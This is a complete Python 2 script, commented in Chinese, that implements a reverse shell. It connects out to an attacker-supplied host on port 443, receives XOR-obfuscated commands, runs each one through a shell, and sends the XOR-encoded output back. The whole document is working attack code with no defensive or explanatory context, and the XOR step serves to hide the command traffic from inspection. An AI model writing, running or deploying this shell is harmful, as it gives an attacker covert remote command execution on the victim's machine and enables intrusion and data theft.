# coding:UTF-8
#!/usr/bin/python

import socket,subprocess,sys


#请求链接的主机和端口
RHOST = sys.argv[1]
RPORT = 443

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

while True:
	#从socket中接受XOR编码的数据
	data = s.recv(1024)

	# XOR the data again with a '\x41' to get back to normal 
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^= 0x41

	#执行编码命令，subprocess模块能够通过PIPE,STDOUT/STDERR/STDIN  把值付给一个变量
	comm = subprocess.Popen(str(en_data),shell = True, stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
	comm.wait()
	STDOUT,STDERR = comm.communicate()

	# 输出编码后的数据并且发送给指定的主机RHOST
	en_STDOUT = bytearray(STDOUT)
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^= 0x41

	s.send(en_STDOUT)
s.close()
